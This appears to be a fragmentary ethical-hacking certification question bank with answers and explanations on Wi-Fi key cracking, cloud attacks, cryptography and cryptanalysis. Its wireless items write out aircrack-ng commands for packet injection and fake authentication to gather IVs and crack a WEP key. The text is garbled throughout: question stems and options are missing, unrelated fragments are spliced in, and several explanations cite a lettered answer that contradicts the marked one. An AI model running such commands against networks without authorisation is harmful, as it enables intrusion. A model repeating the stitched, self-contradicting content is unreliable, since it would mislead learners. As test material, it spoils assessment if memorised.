1164. During a wireless penetration test, a tester detects an AP using the WPA2 encryption. Which of the following attacks should be used to obtain the key?
+ [x] The tester must capture the WPA2 authentication handshake and then crack it.
+ [ ] The tester must change the MAC address of the wireless network card and then use the AirTraf tool to obtain the key.
+ [ ] The tester cannot crack WPA2 because it is in full compliance with the IEEE 802.11i standard.
+ [ ] The tester must use the tool inSSIDer to crack it using the ESSID of the network.
> **Explanation:**
> + An attacker may succeed in unauthorized access to the target network by trying various method such as launching various wireless attacks, placing rogue APs, evil twins, etc. The next step for the attacker is to crack the security imposed by the target wireless network. Generally, a Wi-Fi network uses WEP or WPA/WPA2 encryption for securing wireless communication. The attacker now tries to break the security of the target wireless network by cracking these encryptions systems. Let us see how an attacker cracks these encryption systems to breach wireless network security.
> + WPA encryption is less exploitable than WEP encryption. However, an attacker can still crack WPA/WPA2 by capturing the right type of packets. The attacker can perform this offline and needs to be near the AP for a few moments in order to capture the WPA/WPA2 authentication handshake.

1165. Kenneth, a professional penetration tester, was hired by the XYZ Company to conduct wireless network penetration testing. Kenneth proceeds with the standard steps of wireless penetration testing. He tries to collect lots of initialization vectors (IVs) using the injection method to crack the WEP key. He uses the aircrack-ng tool to capture the IVs from a specific AP. Which of the following aircrack-ng commands will help Kenneth to do this?
+ [ ] `aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80 ath0`

+ [ ] `aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0`
> **Explanation:**
> Start airodump-ng to capture the IVs: The purpose of this step is to capture the IVs generated. This step starts airodump-ng to capture the IVs from the specific AP. Open another console session to capture the generated IVs. Then enter:
> + `airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0`
> + Where:
> 	+ -c 9 is the channel for the wireless network

> 	+ -w capture is file name prefix for the file which will contain the IVs.
> 	+ ath0 is the interface name.
> 
> Test Wireless Device Packet Injection: The purpose of this step ensures that your card is within distance of your AP and can inject packets to it. Enter:

> 	+ -9 means injection test
> 	+ -e teddy is the wireless network name
> 	+ -a 00:14:6C:7E:40:80 is the AP MAC address
> 	+ ath0 is the wireless interface name
> 
> Start the wireless card: Enter the following command to start the wireless card on channel 9 in monitor mode:
> + airmon-ng start wifi0 9
> + Substitute the channel number that your AP runs on for “9” in the command above.
> 
> Use aireplay-ng to do a fake authentication with the AP: In order for an AP to accept a packet, the source MAC address must already be associated. If the source MAC address you are injecting is not associated then the AP ignores the packet and sends out a “DeAuthentication” packet in cleartext. In this state, no new IVs are created because the AP is ignoring all the injected packets.
> + To associate with an AP, use fake authentication:
> + aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
> + Where:

> 	+ 0 reassociation timing in seconds
> 	+ -e teddy is the wireless network name
> 	+ -a 00:14:6C:7E:40:80 is the AP MAC address
> 	+ -h 00:0F:B5:88:AC:82 is our card MAC address
> 	+ ath0 is the wireless interface name

1166. Andrew, a professional penetration tester, was hired by ABC Security, Inc., a small IT-based firm in the United States to conduct a test of the company’s wireless network. During the information-gathering process, Andrew discovers that the company is using the 802.11 g wireless standard. Using the NetSurveyor Wi-Fi network discovery tool, Andrew starts gathering information about wireless APs. After trying several times, he is not able to detect a single AP. What do you think is the reason behind this?
+ [x] SSID broadcast feature must be disabled, so APs cannot be detected.
+ [ ] Andrew must be doing something wrong, as there is no reason for him to not detect access points.
+ [ ] NetSurveyor does not work against 802.11g.
+ [ ] MAC address filtering feature must be disabled on APs or router.
> **Explanation:**
> NetSurveyor is an 802.11 (Wi-Fi) network discovery tool that gathers information about nearby wireless access points in real time and displays it in useful ways. It is a network discovery tool that reports the SSID for each wireless network it detects, along with the channel used by the AP servicing that network. In a secure business environment, this tool is used for detecting the presence of rogue APs. A Wi-Fi network discovery tool will not be able to detect SSID and a wireless network if the SSID broadcast feature is disabled in the AP.

BlueScan works in a non-intrusive way, that is, without establishing a connection with the devices found and without being detected. Superuser privileges are not necessary to execute it.
> + WiFish Finder: WiFish Finder is a tool for assessing whether WiFi devices active in the air are vulnerable to ‘Wi-Fishing’ attacks. Assessment is performed through a combination of passive traffic sniffing and active probing techniques. Most WiFi clients keep a memory of networks (SSIDs) they have connected to in the past. Wi-Fish Finder first builds a list of probed networks and then using a set of clever techniques also determines security setting of each probed network. A client is a fishing target if it is actively seeking to connect to an OPEN or a WEP network.

+ [ ] Vulnerability scanning
+ [ ] Gain access
+ [x] Information gathering
+ [ ] Launch attacks
> **Explanation:**
> + Vulnerability Scanning: Once the attackers gather information about a target device, they search for the attack surfaces of a device (identify the vulnerabilities) which they can attack. Vulnerability scanning allows an attacker to find the total number of vulnerabilities present in the firmware, infrastructure and system components of an IoT device that is accessible. After identifying the attack surface area, the attacker will scan for vulnerabilities in that area to identify an attack vector and perform further exploitation on the device.
> + Gain Access: Vulnerabilities identified in the vulnerability scanning phase allow an attacker to remotely gain access, command and control the attack while evading detection from various security products.

1395. A privilege escalation threat is caused due to which of the following weaknesses?
+ [ ] Due to flaws while provisioning or de-provisioning networks or vulnerabilities in communication encryption.
+ [x] A mistake in the access allocation system causes a customer, third party, or employee to get more access rights than needed.
+ [ ] Weak authentication and authorization controls could lead to illegal access thereby compromising confidential and critical data stored in the cloud.
+ [ ] Due to isolation failure, cloud customers can gain illegal access to the data.
> **Explanation:**
> + Privilege escalation: A mistake in the access allocation system such as coding errors, design flaws, and others can result in a customer, third party, or employee obtaining more access rights than required. This threat arises because of AAA (authentication, authorization, and accountability) vulnerabilities, user-provisioning and de-provisioning vulnerabilities, hypervisor vulnerabilities, unclear roles and responsibilities, misconfiguration, and others.
> + Other given weaknesses causes following threats:
> 	+ **Illegal Access to the Cloud:** Weak authentication and authorization controls could lead to illegal access thereby compromising confidential and critical data stored in the cloud.

1396. Which of the following attacks involves the manipulation of the CND server to store an error page instead of the genuine one to trick users and prevent them from accessing cloud resources?
+ [ ] Zero-day DDoS attack
+ [ ] Brute-force attack
+ [x] CPDoS attack
+ [ ] Mask attack
> **Explanation:**
> + Brute-Force Attack: In a brute-force attack, attackers try every combination of characters until the password is broken.
> + Mask Attack: Mask attack is similar to brute-force attacks but recovers passwords from hashes with a more specific set of characters based on information known to the attacker. Brute-force attacks are time-consuming because the attacker tries all possible combinations of characters to crack the password. In contrast, in a mask attack, the attacker uses a pattern of the password to narrow down the list of possible passwords and reduce the cracking time.
> + **Cache Poisoned Denial of Service (CPDoS)/Content Delivery Network (CDN) Cache Poisoning Attack**: In a CPDoS or CDN cache poisoning attack, attackers create malformed or oversized HTTP requests to trick the origin web server into responding with malicious or error content, which can be cached at the content delivery network (CDN) servers. Therefore, the malicious or error-based content is cached in the CDN server, which delivers it to legitimate users, resulting in a DoS attack on the target network.
> + Zero-Day DDoS Attack: Zero-day DDoS attacks are attacks in which DDoS vulnerabilities do not have patches or effective defensive mechanisms. Until the victim identifies the threat actor’s attack strategy and deploys a patch for the exploited DDoS vulnerability, the attacker actively blocks all the victim’s resources and steals the victim’s data.

1397. In which of the following attacks do attackers gain access to federated services by hacking an administrative identity provider’s user profile and further exploiting token signing certificates to generate forged tokens to access the targeted services?
+ [ ] Slowloris attack
+ [ ] Cloud snooper attack
+ [x] Golden SAML attack
+ [ ] Fragmentation attack
> **Explanation:**
> + Fragmentation Attack: In fragmentation attacks, the attacker sends a large number of fragmented (1500+ byte) packets to a target web server with a relatively small packet rate. Since the protocol allows fragmentation, these packets are usually uninspected as they pass through network equipment such as routers, firewalls, and the intrusion detection system (IDS)/intrusion prevention system (IPS). The reassembly and inspection of these large, fragmented packets consume excessive resources.
> + Slowloris Attack: In Slowloris attacks, the attacker sends partial HTTP requests to the target web server or application. Upon receiving the partial requests, the target server opens multiple connections and waits for the requests to complete. However, these requests remain incomplete, causing the target server’s maximum concurrent connection pool to be filled up and additional connection attempts to be denied.
> + **Golden SAML Attack**: Golden Security Assertion Markup Language (SAML) attacks are implemented to target identity providers on cloud networks such as the Active Directory Federation Service (ADFS) that utilize the SAML protocol for the authentication and authorization of users. Attackers initially gain administrative access to the identity provider’s user profile and exploit token signing certificates to generate forged SAML tokens or responses by manipulating the SAML assertions. This access can be achieved through session hijacking, privilege escalation, or lateral movement via previously exploited vulnerabilities or attacks.
> + Cloud Snooper Attack: Cloud snooper attacks are triggered at AWS security groups (SGs) to compromise the target server and extract sensitive data stealthily. Attackers perform this attack by leveraging a weakly configured firewall or any underlying vulnerabilities. Attackers use various techniques to bypass security controls such as firewalls and gain remote control over the target server.

> + **Domain Snipping**: Involves registering an elapsed domain name.

1399. Out of the following, which is not a type of side-channel attack?
+ [ ] Acoustic cryptanalysis
+ [ ] Data remanence
+ [ ] Timing attack
+ [x] Cybersquatting
> **Explanation:**
> + Attacker compromises the cloud by placing a malicious virtual machine near a target cloud server and then launches side-channel attack. Inside channel attack, the attacker runs a virtual machine on the same physical host of the victim’s virtual machine and takes advantage of shared physical resources (processor cache) to steal data (cryptographic key) from the victim. Side-channel attacks can be implemented by any co-resident user and are mainly due to the vulnerabilities in shared technology resources.
> + Timing attack, data remanence, and acoustic cryptanalysis are types of side-channel attacks, whereas cybersquatting is a type of DNS attack.
> + **Cybersquatting** involves conducting phishing scams by registering a domain name that is similar to a cloud service provider.

1400. Identify the attack in which attackers exploit a zero-day vulnerability on the target application server or use information leaked via a reverse proxy implemented by administrators to gain unauthorized access to network resources by compromising cloud instances.
+ [x] IMDS attack
+ [ ] Cloudborne attack
+ [ ] Cloud snooper attack
+ [ ] CDN cache poisoning attack
> **Explanation:**
> + Cloudborne Attack: Cloudborne is a vulnerability residing in a bare-metal cloud server that enables attackers to implant malicious backdoor in its firmware. The installed backdoor can persist even if the server is reallocated to new clients or businesses that use it as an IaaS.
> + **Instance Metadata Service (IMDS) Attack**: First, an attacker exploits a zero-day vulnerability or a reverse proxy implemented on the target application server. The attacker then compromises the cloud instance running on the server and acquires metadata of the instance. Next, the attacker uses the obtained credentials to gain access to the cloud resources.
> + Cache Poisoned Denial of Service (CPDoS)/Content Delivery Network (CDN) Cache Poisoning Attack: In a CPDoS or CDN cache poisoning attack, attackers create malformed or oversized HTTP requests to trick the origin web server into responding with malicious or error content, which can be cached at the content delivery network (CDN) servers. Therefore, the malicious or error-based content is cached in the CDN server, which delivers it to legitimate users, resulting in a DoS attack on the target network.
> + Cloud Snooper Attack: Cloud snooper attacks are triggered at AWS security groups (SGs) to compromise the target server and extract sensitive data stealthily. Attackers perform this attack by leveraging a weakly configured firewall or any underlying vulnerabilities. Attackers use various techniques to bypass security controls such as firewalls and gain remote control over the target server.

+ [ ] Password reuse
+ [x] Insider threat
> **Explanation:**
> + **Insider Threat**: Insider threat arises mostly from business associates and current or former employees who already have trusted access to the environment and do not need to compromise the credentials separately for performing malicious activities. These types of insiders pose a serious threat to the organization and the AWS environment
> + Reading Local File: Generally, AWS keys are stored in various locations, such as configuration and log files, in an operating system. For example, if a user uses the AWS command-line interface aws-cli, his credentials are stored in the home directory, and the keys are stored in the environment variable file. If an attacker has already gained access to the operating system, he can read the credentials and keys stored in the operating system to perform further exploitation
> + Social Engineering: Attackers use social engineering techniques, such as fake emails, calls, and SMSs, to trick users into revealing their AWS IAM credentials. For example, if a user enters only the API keys to authenticate the AWS, then an attacker can employ a simple phishing technique to steal the API keys and compromise the user account
> + Password Reuse: Password reuse is a very common fault that can cause serious vulnerabilities. Most users reuse the same password for multiple services. If the attacker is able to compromise one password, he can gain access to other cloud services with the same credentials. In some scenarios, if a website is compromised, the attacker can gain access to the back-end database and retrieve password hashes or cleartext passwords stored in the database

+ [ ] Electronic code book (ECB) mode
+ [ ] Counter mode
+ [x] Cipher feedback (CFB) mode
+ [ ] Cipher block chaining (CBC) mode
> **Explanation:**
> + Counter Mode: The counter mode is a block cipher mode of operation that uses a counter value in the encryption and decryption process. A counter value is initiated and sent as the input to the block cipher encryption algorithm with a secret key, and the result is subjected to the XOR operation with a block of plaintext. The output is the ciphertext block. This process is performed in a sequential manner to encrypt all the other plaintext blocks.
> + Electronic Code Book (ECB) Mode: The plaintext is divided into a fixed length of blocks, which is equal to the size of the secret key. In the first stage, the encryption starts by taking the first block of the plaintext, and the secret key is taken as input to the block cipher encryption algorithm; the output is the first block of ciphertext. The process is repeated for all the plaintext blocks.
> + **Cipher Feedback (CFB) Mode:** In the CFB mode, previously generated ciphertext is used as feedback for the encryption algorithm to encrypt the next plaintext block to ciphertext. First, the initialization vector (IV) is stored in a shift register and sent to the encryption algorithm, along with a secret key. From the result of that encryption, the first S bits are selected, and the XOR operation is performed with a plaintext block of size S. The resultant output is the ciphertext block. For the next encryption block, the previous cipher block is given as the input to the shift register; it shifts S bits to the left, and the process is continued till the end of the plaintext.
> + Cipher Block Chaining (CBC) Mode: First, the plaintext is divided into blocks of the same size. The first block is XOR with the initialization vector (IV), and the resultant is sent as input to the block cipher encryption algorithm, along with the secret key. The output is the first block of ciphertext. This cipher block is used to perform XOR with the next plaintext block; the chain process continues till the last block of plaintext.

+ [x] HSM
+ [ ] TPM
+ [ ] Hard-drive encryption
+ [ ] USB encryption
> **Explanation:**
> Types of hardware encryption devices
> + USB Encryption: USB encryption is an additional feature for USB storage devices, which offers onboard encryption services. Encrypted USB devices need an on-device credential system or software- or hardware-based credentials from a computer. USB encryption provides protection against malware distribution over USB and helps in preventing data loss and data leakage. Some hardware USB-encrypted devices include Crypto USB, Kingston Ironkey D300S, and diskAshur Pro 500GB.
> + Hard Drive Encryption: Hard drive encryption is a technology whereby the data stored in the hardware can be encrypted using a wide range of encryption options. Hard drive encryption devices cannot use an on-device keyboard or fingerprint reader; instead, they need a TPM or an HSM. These devices can be installed as an internal drive on a computer. Some hard drive encryption devices include military-grade 256-bit AES Hardware Encryption and DiskCypher AES Sata Hard Drive Encryption.
> + TPM: Trusted Platform Module (TPM) is a crypto-processor or a chip that is present in the motherboard. It can securely store the encryption keys and perform many cryptographic operations. TPM offers various features such as authenticating platform integrity, providing full disk encryption capabilities, performing password storage, and providing software license protection.
> + **HSM**: A hardware security module (HSM) is an additional external security device that is used in a system for crypto-processing, and it can be used for managing, generating, and securely storing cryptographic keys. HSM offers enhanced encryption computation that is useful for symmetric keys longer than 256 bits. High-performance HSM devices are connected to the network using TCP/IP. Some HSM devices include SafeNet Luna Network HSM, nSheild, Cloud HSM, and Cryptosec Dekaton.

1474. Which cipher encrypts the plain text digit (bit or byte) one by one?
+ [x] Stream cipher
+ [ ] Modern cipher
+ [ ] Classical cipher
+ [ ] Block cipher
> **Explanation:**
> + Classical ciphers: Classical ciphers are the most basic type of ciphers, which operate on alphabets (A-Z). Implementation of these ciphers is generally either by hand or with simple mechanical devices.
> + Block ciphers: Block ciphers determine algorithms operating on a block (group of bits) of fixed size with an unvarying transformation specified by a symmetric key.
> + Modern ciphers: The user can calculate the Modern ciphers with the help of a one-way mathematical function that is capable of factoring large prime numbers.
> + Stream ciphers: Symmetric key ciphers are plaintext digits combined with a key stream (pseudorandom cipher digit stream). Here, the user applies the key to each bit, one at a time. Examples include RC4, SEAL, etc.

1475. Which property ensures that a hash function will not produce the same hashed value for two different messages?
+ [x] Collision resistance
+ [ ] Bit length
+ [ ] Key strength
+ [ ] Entropy
> **Explanation:**
> + Collision resistance is a property of cryptographic hash functions. A hash function H is collision resistant if it is hard to find two inputs that hash to the same output, that is, two inputs a and b such that H(a) = H(b), and a≠b.
> + Every hash function with more inputs than outputs will necessarily have collisions. Consider a hash function such as SHA-256 that produces 256 bits of output from an arbitrarily large input. Since it must generate one of 2256 outputs for each member of a much larger set of inputs, the pigeonhole principle guarantees that some inputs will hash to the same output. Collision resistance does not mean that no collisions exist; they are just simply hard to find.

## Public Key Infrastructure (PKI)
1480. A network security administrator is worried about potential man-in-the-middle attacks when users access a corporate website from their workstations. Which of the following is the best remediation against this type of attack?
+ [x] Requiring client and server PKI certificates for all connections
+ [ ] Implementing server-side PKI certificates for all connections
+ [ ] Requiring strong authentication for all DNS queries
+ [ ] Mandating only client-side PKI certificates for all connections
> **Explanation:**
> + A man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. PKI certificates can be used to encrypt traffic between a client and the server. In this scenario, even if an attacker successfully sniffs the network, it will be difficult to decode the authentication tokens or cookies required for a MITM attack.
> + Both server and client certificates encompass the “Issued to” section. Here, for server certificate the “Issued to” section’s value will be the hostname for which it has to be issued and for the client certificate, it will be the user identity or the user name. Both client and server certificates are a significant indication for trust and safe transactions or accessing a website.

1481. Which of the following defines the role of a root certificate authority (CA) in a public key infrastructure (PKI)?
+ [x] The CA is the trusted root that issues certificates.
+ [ ] The root CA is the recovery agent used to encrypt data when a user’s certificate is lost.
+ [ ] The root CA stores the user’s hash value for safekeeping.
+ [ ] The root CA is used to encrypt e-mail messages to prevent unintended disclosure of data.
> **Explanation:**
> A certificate authority can issue multiple certificates in the form of a tree structure. A root certificate is the top-most certificate of the tree; the private key that is used to “sign” other certificates. All certificates signed by the root certificate, with the "CA" field set to true, inherit the trustworthiness of the root certificate – a signature by a root certificate is somewhat analogous to “notarizing” an identity in the physical world. Such a certificate is called an intermediate certificate or subordinate CA certificate. Certificates further down the tree also depend on the trustworthiness of the intermediates.

1482. Which of the PKI components is responsible for issuing and verifying digital certificate?

+ [ ] Certificate authority
+ [ ] Validation authority
> **Explanation:**
> The correct answer is (c). Registration authority (RA): This acts as the verifier for the certificate authority.  
> 
> The PKI role that assures valid and correct registration is called a registration authority (RA). An RA is responsible for accepting requests for digital certificates and authenticating the entity making the request. In a Microsoft PKI, a registration authority is usually called a subordinate CA.

1486. Which of the following components of public key infrastructure stores certificates along with their public keys?
+ [ ] Certificate authority
+ [x] Validation authority
+ [ ] Registration authority

1487. Which of the following is a characteristic of public key infrastructure (PKI)?
+ [ ] Public-key cryptosystems are faster than symmetric-key cryptosystems.
+ [x] Public-key cryptosystems distribute public-keys within digital signatures.
+ [ ] Public-key cryptosystems do not provide technical nonrepudiation via digital signatures.
+ [ ] Public-key cryptosystems do not require a secure key distribution channel.
> **Explanation:**
> Public-key cryptography and the public-key/private-key pair provides an important benefit: the ability to widely distribute the public key on a server, or in a central directory, without jeopardizing the integrity of the private key component of the key pair. This eliminates the need to transmit the public key to every correspondent in the system.


## Email and Disk Encryption
1488. Which of the following is an example of an asymmetric encryption implementation?

## Cryptanalysis and Cryptography Attack Countermeasures
1501. In which of the following attacks does an attacker select a series of ciphertexts and then observe the resulting plaintext blocks?
+ [ ] Ciphertext-only attack
+ [ ] Chosen-key attack
+ [x] Adaptive chosen-ciphertext attack
+ [ ] Midnight attack
> **Explanation:**
> + **Adaptive Chosen-ciphertext Attack**: In this attack, the attacker selects a series of ciphertexts and then observes the resulting plaintext blocks.
> + Ciphertext-only Attack: Ciphertext-only is less effective but much more likely for the attacker. The attacker only has access to a collection of ciphertexts. The attack is completely successful if the corresponding plaintexts (or even better, the key) can be deduced.
> + Lunchtime or Midnight Attack: In this attack, the attacker can have access to the system for only a limited amount of time or can access only a few plaintext-ciphertext pairs.
> + Chosen-key Attack: In this type of attack, an attacker not only breaks a ciphertext but also breaks into a larger system, which is dependent of that ciphertext. The attacker usually breaks an n-bit key cipher into 2 n/2 operations. Once an attacker breaks the cipher, he gets access to the system, and he can control the whole system, access confidential data, and perform further attacks.

Attempting to decrypt a message using all possible keys until you discover the key used for encryption. This method of discovering a key is called a brute-force attack
> + **Side-Channel Attack**: A side-channel attack is a physical attack performed on a cryptographic device/cryptosystem to gain sensitive information. Cryptography is generally part of the hardware or software that runs on physical devices such as semi-conductors (resistor, transistor, and so on) that interact with and affect various environmental factors:

> + Meet-in-the-Middle Attack: A meet-in-the-middle attack is the best attack method for cryptographic algorithms using multiple keys for encryption. This attack reduces the number of brute-force permutations required to decode text encrypted by more than one key. A meet-in-the-middle attack uses space-time trade-off; it is also a type of birthday attack because it exploits the mathematics behind the birthday paradox, and the attack consumes less time than an exhaustive attack

1503. Which of the following cryptanalysis methods is also known as a plaintext attack, is based on finding affine approximations to the action of a cipher, and is commonly used on block ciphers?
+ [ ] Frequency analysis
+ [ ] Differential cryptanalysis
+ [x] Linear cryptanalysis
+ [ ] Integral cryptanalysis
> **Explanation:**
> + Differential Cryptanalysis: Differential cryptanalysis is a form of cryptanalysis applicable to symmetric-key algorithms. It was invented by Eli Biham and Adi Shamir. Essentially, it is the examination of differences in input and how that affects the resultant difference in the output. It originally worked only with chosen plaintext. It can also work with known plaintext and ciphertext
> + **Linear Cryptanalysis**: Linear cryptanalysis is based on finding affine approximations to the action of a cipher. It is commonly used on block ciphers. This technique was invented by Mitsarue Matsui. It is a known plaintext attack and uses a linear approximation to describe the behavior of the block cipher. Given sufficient pairs of plaintext and corresponding ciphertext, bits of information about the key can be obtained
> + Integral Cryptanalysis: Integral cryptanalysis was first described by Lars Knudsen. This attack is particularly useful against block ciphers based on substitution-permutation networks as an extension of differential cryptanalysis. The differential analysis looks at pairs of inputs that differ in only one bit position, with all other bits being identical.
> + Frequency Analysis: Frequency analysis is a code breaking methodology which isthe study of the frequency of letters or groups of letters in a ciphertext. Frequency analysis of letters and words is another method used to crack ciphers. It works on the principle that, in any given stretch of written language, certain letters and combinations of letters occur with varying frequencies

1504. Which of the following cryptanalysis methods is applicable to symmetric key algorithms?
+ [ ] Frequency cryptanalysis
+ [x] Differential cryptanalysis
+ [ ] Linear cryptanalysis
+ [ ] Integral cryptanalysis
> **Explanation:**

It is the examination of differences in an input and how that affects the resultant difference in the output. It originally worked only with chosen plaintext. It can also work only with known plaintext and ciphertext.

1505. In which of the following attacks, can an attacker obtain ciphertexts encrypted under two different keys and gather plaintext and matching ciphertext?
+ [ ] Ciphertext-only attack
+ [ ] Adaptive chosen-plaintext attack
+ [x] Related-key attack
+ [ ] Chosen-plaintext attack
> **Explanation:**
> The correct answer is (c). Related-key attack: The related-key attack is similar to the chosen plaintext attack, except that the attacker can obtain ciphertexts encrypted under two different keys. This is actually a very useful attack if one can obtain the plaintext and matching ciphertext. The attack requires that the differing keys be closely related, for example, in a wireless environment where subsequent keys might be derived from previous keys. Then, while the keys are different, they are close. Much like the ciphertext-only attack, this one is most likely to yield a partial break.

1506. Out of the following attacks, which attack is a physical attack that is performed on a cryptographic device/cryptosystem to gain sensitive information?
+ [ ] Hash collision attack
+ [ ] MITM attack
+ [ ] DUHK attack
+ [x] Side channel attack
> **Explanation:**
> The correct answer is (a). In a side channel attack, an attacker monitors channels (environmental factors) and tries to acquire the information useful for cryptanalysis. The information collected in this process is termed as side channel information. Side channel attacks do not relate with traditional/ theoretical form of attacks like brute force attack. The concept of the side channel attack depends on the way systems implement cryptographic algorithms, rather than the algorithm itself.

1507. Which of the following attacks mainly affects any hardware/software using an ANSI X9.31 random number generator (RNG)?
+ [ ] Rainbow table attack
+ [x] DUHK attack
+ [ ] Hash collision attack
+ [ ] Side channel attack
> **Explanation:**
> The correct answer is (b). DUHK (don't use hard-coded keys) is a cryptographic vulnerability that allows attackers to obtain encryption keys used to secure VPNs and web sessions. This attack mainly affects any hardware/software using ANSI X9.31 random number generator (RNG). The pseudorandom number generators (PRNGs) generate random sequences of bits based on the initial secret value called a seed and the current state. The PRNG algorithm generates cryptographic keys that are used to establish a secure communication channel over VPN network. In some cases, the seed key is hardcoded into the implementation. Both the factors are the key issues of DUHK attack as any attacker could combine ANSI X9.31 with the hard coded seed key to decrypt the encrypted data sent or received by that device.

+ [x] Avoid using fixed-time algorithms
+ [ ] Add amplitude or temporal noise to reduce the attacker’s signal-to-noise ratio
+ [ ] Implement differential matching techniques to minimize net data-dependent leakage
> **Explanation:**
> Mitigation techniques for side-channel-attacks include the following:
> + Use differential power analysis (DPA) proof protocols with delimited side-channel leakage characteristics and update the keys before the leakage accumulation is significant
> + **Use fixed-time algorithms (i.e., no data-dependent delays)**
> + Mask and blind algorithms using random nonces
> + Implement differential matching techniques to minimize net data-dependent leakage from logic-level transitions

1512. Which of the following cryptography attack methods is usually performed without the use of a computer?
+ [x] Rubber hose attack
+ [ ] Ciphertext-only attack
+ [ ] Rainbow table attack
+ [ ] Chosen key attack
> **Explanation:**
> The correct answer is (c). In a rubber hose attack, attackers extract cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture. Generally, people under pressure cannot maintain security, and they reveal secret or hidden information. Attackers torture the concerned person to reveal secret keys or passwords used to encrypt the information.

1513. An attacker has captured a target file that is encrypted with public key cryptography. Which of the attacks below is likely to be used to crack the target file?
+ [ ] Memory trade-off attack
+ [ ] Replay attack
+ [x] Chosen plain-text attack
+ [ ] Timing attack
> **Explanation:**
> + Timing attack: It is based on repeatedly measuring the exact execution times of modular exponentiation operations. The attacker tries to break the ciphertext by analyzing the time taken to execute the encryption and decryption algorithm for various inputs. In a computer, the time taken to execute a logical operation may vary based on the input given. The attacker by giving varying inputs tries to extract the plaintext.
> + Replay attack: In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access. The attacker uses this type of attack to replay bank transactions or other similar types of data transfer, in the hope of replicating and/or altering activities, such as banking deposits or transfers.
> + **Chosen-plaintext attack**: Chosen plaintext attack is a very effective type of cryptanalysis attack. In this attack, the attacker obtains the ciphertexts corresponding to a set of plaintexts of his own choosing. This can allow the attacker to attempt to derive the key used and thus decrypt other messages encrypted with that key. Basically, since the attacker knows the plaintext and the resultant ciphertext, he has a lot of insight into the key used. This technique can be difficult but is not impossible.
> + The circumstances by which an attacker may obtain ciphertexts for given plaintexts are rare. However, modern cryptography is implemented in software or hardware and is used for a diverse range of applications; for many cases, a chosen-plaintext attack is often very feasible. Chosen-plaintext attacks become extremely important in the context of public key cryptography, where the encryption key is public and so attackers can encrypt any plaintext they choose.

1514. Out of the following, identify the attack that is used for cracking a cryptographic algorithm using multiple keys for encryption.
+ [ ] Side channel attack
+ [x] Meet-in-the-middle attack
+ [ ] DUHK attack
+ [ ] Rainbow table attack
> **Explanation:**
> + A meet-in-the-middle attack is the best attack method for cryptographic algorithms using multiple keys for encryption. This attack reduces the number of brute force permutations needed to decode text encrypted by more than one key and conducted mainly for forging signatures on mixed type digital signatures. A meet-in-the-middle attack uses space–time tradeoff; it is a birthday attack because it exploits the mathematics behind the birthday paradox. It is called a meet-in-the-middle attack because it works by encrypting from one end and decrypting from the other end, thus meeting “in the middle.”
> + In the meet-in-the-middle attack, the attacker uses a known plaintext message and has access to both the plaintext as well as the respective encrypted text. It takes less time than an exhaustive attack and is used by attackers for forging signatures, even on digital signatures that use the multiple-encryption scheme.

1515. Which of the following is a code-breaking methodology that involves the use of social engineering techniques to extract cryptography keys?

Frequency analysis of letters and words is another method used to crack ciphers. It works on the principle that, in any given stretch of written language, certain letters and combinations of letters occur with varying frequencies.
> + **Trickery and Deceit**: Trickery and deceit require a high level of mathematical and cryptographic skills. It involves the use of social engineering techniques to extract cryptography keys.
> + One-Time Pad: One can crack any cipher if provided with sufficient time and resources. However, there is an exception called a one-time pad, which users assume to be unbreakable even with infinite resources. A one-time pad mostly contains a non-repeating set of letters or numbers, which the system chooses randomly. The user writes them on small sheets of paper and then pastes them together in a pad.

It is used to perform cryptanalysis of several algorithms (Vigenère, RSA, AES, etc.)
> + CrypTool 2 (CT2) – It supports visual programming GUI and execution of cascades of cryptographic procedures. It runs under Windows.

+ [ ] Frequency analysis
+ [ ] One-time pad
+ [ ] Trickery and deceit
+ [x] Brute force
> **Explanation:**
> The correct answer is (a). Brute force: This attack is a common cryptanalytic technique, or exhaustive search, in which the keys are determined by trying every possible combination of characters. The efficiency of a brute-force attack depends on the hardware configuration. The use of faster processors means testing more keys per second. Cryptanalysts carried out a successful brute-force attack on a DES encryption method that effectively made DES obsolete.

1518. In which of the following attacks does an attacker reduce the number of brute-force permutations required to decode text encrypted by more than one key and use the space-time trade-off?

> + Hash Collision Attack: A hash collision attack is performed by finding two different input messages that result in the same hash output. For example, in a hash collision attack, “hash(a1) = hash(a2)”, where a1 and a2 represent some random messages. Since the algorithm itself randomly selects these messages, attackers have no role in the content of these messages
> + **Meet-in-the-Middle Attack**: A meet-in-the-middle attack is the best attack method for cryptographic algorithms using multiple keys for encryption. This attack reduces the number of brute-force permutations required to decode text encrypted by more than one key.
